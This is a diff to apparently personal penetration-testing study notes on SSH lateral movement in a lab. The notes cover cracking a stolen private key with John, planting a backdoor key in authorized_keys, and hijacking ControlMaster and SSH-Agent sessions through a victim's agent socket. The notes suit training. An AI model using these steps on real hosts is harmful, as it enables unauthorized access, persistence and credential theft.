@@ -38,9 +38,44 @@ ssh -i svuser.key svuser@controller
 
 <pre><code><strong>#Copy file over to Kali
 </strong><strong>scp root@linuxvictim:/home/linuxvictim/svuser.key .
+</strong><strong>
+</strong><strong>#Convert the hash to format used by John &#x26;&#x26; Crack it
 </strong>/usr/share/john/ssh2john.py svuser.key > svuser.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt svuser.hash
 </code></pre>
+
+</details>
+
+<details>
+
+<summary>Find Machines that's connected from the victim</summary>
+
+* cat \~/.ssh/known\_hosts
+  * If HashKnownHosts is enabled --> entries in known\_hosts are hashed
+* cat \~/.bash\_history
+
+</details>
+
+<details>
+
+<summary>SSH Persistency</summary>
+
+* Generate SSH keypair
+  *   ```
+      ssh-keygen
+      ```
+
+
+* Put Kali's public key (\~/.ssh/id\_rsa.pub) to victim authorized\_keys file
+  *   ```
+      echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8=" >> /home/linuxvictim/.ssh/authorized_keys
+      ```
+
+
+* Now, can just:
+  * ```
+    ssh linuxvictim@linuxvictim
+    ```
 
 </details>
 
@@ -77,10 +112,132 @@ amrois
 
 </details>
 
-<pre><code><strong>scp root@linuxvictim:/home/linuxvictim/svuser.key .
-</strong>/usr/share/john/ssh2john.py svuser.key > svuser.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt svuser.hash
-</code></pre>
+<details>
+
+<summary>SSH Hijacking (ControlMaster)</summary>
+
+* Using an existing SSH connection to gain access to another machine
+* Allows for the sharing of multiple SSH session over a single network connection
+
+**ControlMaster feature**
+
+* In \~/.ssh/config
+  *   ```
+      Host *
+              ControlPath ~/.ssh/controlmaster/%r@%h:%p      --> specifies where the ControlMaster socket file is stored
+              ControlMaster auto
+              ControlPersist 10m
+      ```
+
+
+* Then,&#x20;
+  *   ```
+      chmod 644 ~/.ssh/config
+      mkdir ~/.ssh/controlmaster
+      ```
+
+
+* SSH to the controller box and from controller box ssh to linuxvictim
+  *   ```
+      ssh offsec@controller
+      ssh offsec@linuxvictim
+      ```
+
+
+* Now, in \~/.ssh/controlmaster
+  * Have `offsec@linuxvictim:22`entry
+* Finally, attacker able to ssh into the linuxvictim machine from controller without having to enter any password --> "piggybacking" the active legit session to linuxvictim
+  * ```
+    ssh offsec@linuxvictim
+    OR
+    ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
+    ```
+
+</details>
+
+<details>
+
+<summary>SSH Hijacking (SSH-Agent)</summary>
+
+* Keeps track of user's private keys and allows them to be used without having to repeat their passphrases
+
+- Setting up
+  * Installing public key to both intermediate and destination server
+    *   ```
+        ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
+        ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
+        ```
+
+
+  * In kali: \~/.ssh/config
+    *   ```
+        ForwardAgent yes
+        ```
+
+
+  * In intermediate server /etc/ssh/sshd\_config
+    *   ```
+        AllowAgentForwarding yes
+        ```
+
+
+  * Start SSH agent on Kali
+    *   ```
+        eval `ssh-agent`
+        ```
+
+
+  * Add our keys to the SSH-agent on kali
+    *   ```
+        ssh-add
+        ```
+
+
+  * Now, able to ssh to intermediate server and from intermediate server ssh to destination server
+    *   <pre><code><strong>ssh offsec@controller
+        </strong>ssh offsec@linuxvictim
+        </code></pre>
+
+
+
+Exploiting
+
+*   If there exists a connection from the controller to the linuxvictim that's not the attacker's -->&#x20;
+
+    When the attacker access the controller with the same user as the currently logged in user session, they're able to ssh to the linuxvictim without any creds
+
+- ELSE if the attacker account is different from the current session user
+  *   Ensure that user's open SSH-Agent socket is present:
+
+      ```
+      ps aux | grep ssh
+      ```
+
+
+  * Find PID of SSH process (Eg: bash(2161))
+    *   ```
+        pstree -p offsec | grep ssh
+        ```
+
+
+  * Search for the env variable called SSH\_AUTH\_SOCK
+    *   ```
+        cat /proc/2161/environ
+        ```
+
+
+  * Add SSH auth socket
+    *   ```
+        SSH_AUTH_SOCK=/tmp/ssh-qAgOqMO4H1/agent.2160 ssh-add -l
+        ```
+
+
+  * Use new SSH auth socket to login to linuxvictim
+    * ```
+      SSH_AUTH_SOCK=/tmp/ssh-qAgOqMO4H1/agent.2160 ssh offsec@linuxvictim
+      ```
+
+</details>
 
 
 
